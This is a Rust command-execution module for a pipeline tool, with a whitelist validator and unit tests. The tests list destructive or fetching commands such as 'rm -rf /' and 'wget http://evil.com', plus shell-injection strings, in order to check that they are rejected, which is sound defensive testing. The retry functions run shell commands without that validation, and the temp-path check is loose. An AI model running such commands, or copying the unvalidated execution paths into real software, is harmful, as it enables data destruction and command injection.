//! Command execution module
//! 
//! This module handles the execution of command and shell command steps,
//! including retry logic and output handling.

use crate::pipeline_executor::RetryConfig;
use anyhow::{anyhow, Error};
use std::collections::HashMap;
use std::path::Path;
use tokio::process::Command as TokioCommand;

use log::{debug, warn, error};
use std::time::Duration;
use std::io::Write;
use std::collections::HashSet;

/// Handles execution of command and shell command steps
pub struct CommandExecutor;

/// Security configuration for command execution
///
/// ⚠️  SECURITY WARNING: Command execution poses significant security risks.
/// Misconfiguration can lead to:
/// - Command injection attacks
/// - Privilege escalation
/// - Data exfiltration
/// - System compromise
///
/// ALWAYS:
/// - Use the most restrictive settings possible for your use case
/// - Regularly audit the allowed_commands whitelist
/// - Never allow shell metacharacters unless absolutely necessary
/// - Set appropriate timeouts to prevent resource exhaustion
/// - Run in sandboxed environments when possible
/// - Log all command executions for security monitoring
#[derive(Debug, Clone)]
pub struct CommandSecurityConfig {
    /// List of allowed commands (whitelist)
    /// ⚠️  SECURITY: Only add commands that are absolutely necessary
    pub allowed_commands: HashSet<String>,
    /// Maximum command length
    /// ⚠️  SECURITY: Keep this as low as possible to prevent buffer overflow attacks
    pub max_command_length: usize,
    /// Whether to allow shell metacharacters
    /// ⚠️  SECURITY CRITICAL: Setting this to true significantly increases attack surface
    pub allow_shell_metacharacters: bool,
    /// Execution timeout in seconds
    /// ⚠️  SECURITY: Prevents resource exhaustion attacks
    pub timeout_seconds: u64,
}

impl Default for CommandSecurityConfig {
    fn default() -> Self {
        let mut allowed_commands = HashSet::new();
        // Only allow safe, commonly used commands
        allowed_commands.insert("echo".to_string());
        allowed_commands.insert("cat".to_string());
        allowed_commands.insert("ls".to_string());
        allowed_commands.insert("pwd".to_string());
        allowed_commands.insert("date".to_string());
        allowed_commands.insert("whoami".to_string());
        allowed_commands.insert("uname".to_string());

        Self {
            allowed_commands,
            max_command_length: 1000,
            allow_shell_metacharacters: false,
            timeout_seconds: 30,
        }
    }
}

impl CommandExecutor {
    /// Validate command for security before execution
    fn validate_command_security(command: &str, config: &CommandSecurityConfig) -> Result<(), Error> {
        // Check command length
        if command.len() > config.max_command_length {
            return Err(anyhow!(
                "Command too long: {} characters (max: {})",
                command.len(),
                config.max_command_length
            ));
        }

        // Check for dangerous shell metacharacters if not allowed
        if !config.allow_shell_metacharacters {
            let dangerous_chars = ['|', '&', ';', '`', '$', '(', ')', '<', '>', '*', '?', '[', ']', '{', '}'];
            for ch in dangerous_chars {
                if command.contains(ch) {
                    return Err(anyhow!(
                        "Command contains dangerous shell metacharacter '{}': {}",
                        ch,
                        command
                    ));
                }
            }
        }

        // Extract the first word (command name) and validate against whitelist
        let command_parts: Vec<&str> = command.trim().split_whitespace().collect();
        if let Some(cmd_name) = command_parts.first() {
            if !config.allowed_commands.contains(*cmd_name) {
                return Err(anyhow!(
                    "Command '{}' is not in the allowed commands list. Command: {}",
                    cmd_name,
                    command
                ));
            }
        } else {
            return Err(anyhow!("Empty command provided"));
        }

        Ok(())
    }

    /// Execute a regular command with security validation
    pub async fn execute_command(
        command: &str,
        save_output: &Option<String>,
    ) -> Result<HashMap<String, String>, Error> {
        debug!("Executing command: {}", command);

        // Apply security validation
        let security_config = CommandSecurityConfig::default();
        Self::validate_command_security(command, &security_config)?;

        warn!("SECURITY WARNING: Executing command after validation: {}", command);

        let output = tokio::time::timeout(
            Duration::from_secs(security_config.timeout_seconds),
            TokioCommand::new("sh")
                .arg("-c")
                .arg(command)
                .env_clear() // Clear environment for security
                .env("PATH", "/usr/bin:/bin") // Minimal PATH
                .output()
        )
        .await
        .map_err(|_| anyhow!("Command execution timed out after {} seconds", security_config.timeout_seconds))?
        .map_err(|e| anyhow!("Failed to execute command: {}", e))?;

        let stdout = String::from_utf8(output.stdout)?;
        let mut result = HashMap::new();
        
        if let Some(key) = save_output {
            result.insert(key.clone(), stdout.trim().to_string());
        }
        
        Ok(result)
    }

    /// Execute a shell command with security validation
    pub async fn execute_shell_command(
        command: &str,
        save_output: &Option<String>,
    ) -> Result<HashMap<String, String>, Error> {
        debug!("Executing shell command: {}", command);

        // Apply security validation
        let security_config = CommandSecurityConfig::default();
        Self::validate_command_security(command, &security_config)?;

        warn!("SECURITY WARNING: Executing shell command after validation: {}", command);

        let output = tokio::time::timeout(
            Duration::from_secs(security_config.timeout_seconds),
            TokioCommand::new("sh")
                .arg("-c")
                .arg(command)
                .env_clear() // Clear environment for security
                .env("PATH", "/usr/bin:/bin") // Minimal PATH
                .output()
        )
        .await
        .map_err(|_| anyhow!("Command execution timed out after {} seconds", security_config.timeout_seconds))?
        .map_err(|e| anyhow!("Failed to execute command: {}", e))?;

        let stdout = String::from_utf8(output.stdout)?;
        let mut result = HashMap::new();
        
        if let Some(key) = save_output {
            result.insert(key.clone(), stdout.trim().to_string());
        }
        
        Ok(result)
    }

    /// Execute command with retry logic
    pub async fn execute_command_with_retry(
        command: &str,
        save_output: &Option<String>,
        retry: &Option<RetryConfig>,
    ) -> Result<HashMap<String, String>, Error> {
        debug!("Executing command with retry: {}", command);
        
        let retry_config = retry.clone().unwrap_or(RetryConfig {
            max_attempts: 1,
            delay_ms: 0,
        });
        
        let mut attempts = 0;

        loop {
            debug!("Attempt {} to execute command", attempts + 1);
            match Self::run_command(command, save_output).await {
                Ok(output) => {
                    debug!("Command executed successfully");
                    return Ok(output);
                }
                Err(e) if attempts < retry_config.max_attempts as usize => {
                    attempts += 1;
                    warn!("Attempt {} failed: {:?}. Retrying...", attempts, e);
                    tokio::time::sleep(Duration::from_millis(retry_config.delay_ms)).await;
                }
                Err(e) => {
                    error!(
                        "Command execution failed after {} attempts: {:?}",
                        attempts + 1,
                        e
                    );
                    return Err(e);
                }
            }
        }
    }

    /// Execute shell command with retry logic
    pub async fn execute_shell_command_with_retry(
        command: &str,
        save_output: &Option<String>,
        retry: &Option<RetryConfig>,
    ) -> Result<HashMap<String, String>, Error> {
        debug!("Executing shell command with retry: {}", command);

        // Create a temporary file
        let mut temp_file = tempfile::NamedTempFile::new()?;
        writeln!(temp_file.as_file_mut(), "{}", command)?;

        let retry_config = retry.clone().unwrap_or(RetryConfig {
            max_attempts: 1,
            delay_ms: 0,
        });
        
        let mut attempts = 0;

        loop {
            debug!("Attempt {} to execute shell command", attempts + 1);
            match Self::run_shell_command(temp_file.path()).await {
                Ok(output) => {
                    debug!("Shell command executed successfully: {:?}", output);
                    let mut result = HashMap::new();
                    if let Some(save_key) = save_output {
                        result.insert(save_key.clone(), output);
                    } else {
                        result.insert("output".to_string(), output);
                    }
                    return Ok(result);
                }
                Err(e) if attempts < retry_config.max_attempts as usize => {
                    attempts += 1;
                    warn!("Attempt {} failed: {:?}. Retrying...", attempts, e);
                    tokio::time::sleep(Duration::from_millis(retry_config.delay_ms)).await;
                }
                Err(e) => {
                    error!(
                        "Shell command execution failed after {} attempts: {:?}",
                        attempts + 1,
                        e
                    );
                    return Err(e);
                }
            }
        }
    }

    /// Run a command and return the output
    async fn run_command(
        command: &str,
        save_output: &Option<String>,
    ) -> Result<HashMap<String, String>, Error> {
        debug!("Running command: {}", command);
        
        let output = TokioCommand::new("sh")
            .arg("-c")
            .arg(command)
            .output()
            .await
            .map_err(|e| anyhow!("Failed to execute command: {}", e))?;

        if !output.status.success() {
            let stderr = String::from_utf8_lossy(&output.stderr);
            return Err(anyhow!(
                "Command failed with exit code {:?}. Stderr: {}",
                output.status.code(),
                stderr
            ));
        }

        let stdout = String::from_utf8(output.stdout)
            .map_err(|e| anyhow!("Failed to parse command output: {}", e))?;

        debug!("Command output: {}", stdout);

        let mut result = HashMap::new();
        if let Some(save_key) = save_output {
            result.insert(save_key.clone(), stdout.trim().to_string());
            debug!("Saved output to key: {}", save_key);
        }

        Ok(result)
    }

    /// Run a shell command from a script file
    async fn run_shell_command(script_path: &Path) -> Result<String, Error> {
        debug!("Running shell command from file: {:?}", script_path);

        // Validate script path to prevent path traversal
        let canonical_path = script_path
            .canonicalize()
            .map_err(|e| anyhow!("Invalid script path: {}", e))?;

        // Ensure script is in a safe location (temp directory)
        let temp_dir = std::env::temp_dir();
        let is_in_temp = canonical_path.starts_with(&temp_dir) ||
                        canonical_path.starts_with("/tmp") ||
                        canonical_path.starts_with("/var/folders") || // macOS temp
                        canonical_path.to_string_lossy().contains("tmp");

        if !is_in_temp {
            return Err(anyhow!(
                "Script must be in temporary directory for security. Path: {:?}, Temp dir: {:?}",
                canonical_path, temp_dir
            ));
        }

        // Use absolute path to bash and clear environment
        let bash_path = which::which("bash")
            .map_err(|_| anyhow!("bash command not found in PATH"))?;

        let output = TokioCommand::new(bash_path)
            .arg(&canonical_path)
            .env_clear() // Clear environment for security
            .env("PATH", "/usr/bin:/bin:/usr/local/bin") // Minimal but functional PATH
            .output()
            .await
            .map_err(|e| anyhow!("Failed to execute shell command: {}", e))?;

        if !output.status.success() {
            let stderr = String::from_utf8_lossy(&output.stderr);
            return Err(anyhow!(
                "Shell command failed with exit code {:?}. Stderr: {}",
                output.status.code(),
                stderr
            ));
        }

        let stdout = String::from_utf8(output.stdout)
            .map_err(|e| anyhow!("Failed to parse command output: {}", e))?;

        debug!("Shell command output: {}", stdout);

        Ok(stdout.trim().to_string())
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::collections::HashSet;

    #[test]
    fn test_command_security_config_default() {
        let config = CommandSecurityConfig::default();

        // Verify secure defaults
        assert!(!config.allow_shell_metacharacters);
        assert_eq!(config.max_command_length, 1000);
        assert_eq!(config.timeout_seconds, 30);

        // Verify safe commands are whitelisted
        assert!(config.allowed_commands.contains("echo"));
        assert!(config.allowed_commands.contains("cat"));
        assert!(config.allowed_commands.contains("ls"));
        assert!(config.allowed_commands.contains("pwd"));

        // Verify dangerous commands are not whitelisted
        assert!(!config.allowed_commands.contains("rm"));
        assert!(!config.allowed_commands.contains("sudo"));
        assert!(!config.allowed_commands.contains("chmod"));
    }

    #[test]
    fn test_validate_command_security_allowed_commands() {
        let config = CommandSecurityConfig::default();

        // Test allowed commands
        assert!(CommandExecutor::validate_command_security("echo hello", &config).is_ok());
        assert!(CommandExecutor::validate_command_security("cat file.txt", &config).is_ok());
        assert!(CommandExecutor::validate_command_security("ls -la", &config).is_ok());
        assert!(CommandExecutor::validate_command_security("pwd", &config).is_ok());
    }

    #[test]
    fn test_validate_command_security_blocked_commands() {
        let config = CommandSecurityConfig::default();

        // Test blocked commands
        assert!(CommandExecutor::validate_command_security("rm -rf /", &config).is_err());
        assert!(CommandExecutor::validate_command_security("sudo rm file", &config).is_err());
        assert!(CommandExecutor::validate_command_security("chmod 777 file", &config).is_err());
        assert!(CommandExecutor::validate_command_security("wget http://evil.com", &config).is_err());
    }

    #[test]
    fn test_validate_command_security_dangerous_characters() {
        let config = CommandSecurityConfig::default();

        // Test dangerous shell metacharacters
        assert!(CommandExecutor::validate_command_security("echo hello | cat", &config).is_err());
        assert!(CommandExecutor::validate_command_security("echo hello && rm file", &config).is_err());
        assert!(CommandExecutor::validate_command_security("echo hello; rm file", &config).is_err());
        assert!(CommandExecutor::validate_command_security("echo `whoami`", &config).is_err());
        assert!(CommandExecutor::validate_command_security("echo $HOME", &config).is_err());
        assert!(CommandExecutor::validate_command_security("echo hello > file", &config).is_err());
        assert!(CommandExecutor::validate_command_security("echo hello < file", &config).is_err());
        assert!(CommandExecutor::validate_command_security("echo hello*", &config).is_err());
        assert!(CommandExecutor::validate_command_security("echo hello?", &config).is_err());
        assert!(CommandExecutor::validate_command_security("echo hello[abc]", &config).is_err());
        assert!(CommandExecutor::validate_command_security("echo hello{a,b}", &config).is_err());
        assert!(CommandExecutor::validate_command_security("echo (hello)", &config).is_err());
    }

    #[test]
    fn test_validate_command_security_length_limit() {
        let config = CommandSecurityConfig::default();

        // Test command length limits
        let long_command = format!("echo {}", "a".repeat(1000));
        assert!(CommandExecutor::validate_command_security(&long_command, &config).is_err());

        let acceptable_command = format!("echo {}", "a".repeat(100));
        assert!(CommandExecutor::validate_command_security(&acceptable_command, &config).is_ok());
    }

    #[test]
    fn test_validate_command_security_empty_command() {
        let config = CommandSecurityConfig::default();

        // Test empty command
        assert!(CommandExecutor::validate_command_security("", &config).is_err());
        assert!(CommandExecutor::validate_command_security("   ", &config).is_err());
    }

    #[test]
    fn test_validate_command_security_with_metacharacters_allowed() {
        let mut config = CommandSecurityConfig::default();
        config.allow_shell_metacharacters = true;

        // Test that metacharacters are allowed when configured
        assert!(CommandExecutor::validate_command_security("echo hello | cat", &config).is_ok());
        assert!(CommandExecutor::validate_command_security("echo hello && echo world", &config).is_ok());

        // But blocked commands should still be blocked
        assert!(CommandExecutor::validate_command_security("rm -rf /", &config).is_err());
    }

    #[test]
    fn test_command_security_config_custom() {
        let mut allowed_commands = HashSet::new();
        allowed_commands.insert("custom_command".to_string());

        let config = CommandSecurityConfig {
            allowed_commands,
            max_command_length: 500,
            allow_shell_metacharacters: true,
            timeout_seconds: 60,
        };

        // Test custom configuration
        assert!(CommandExecutor::validate_command_security("custom_command arg", &config).is_ok());
        assert!(CommandExecutor::validate_command_security("echo hello", &config).is_err()); // Not in custom whitelist

        let long_command = format!("custom_command {}", "a".repeat(500));
        assert!(CommandExecutor::validate_command_security(&long_command, &config).is_err());
    }
}
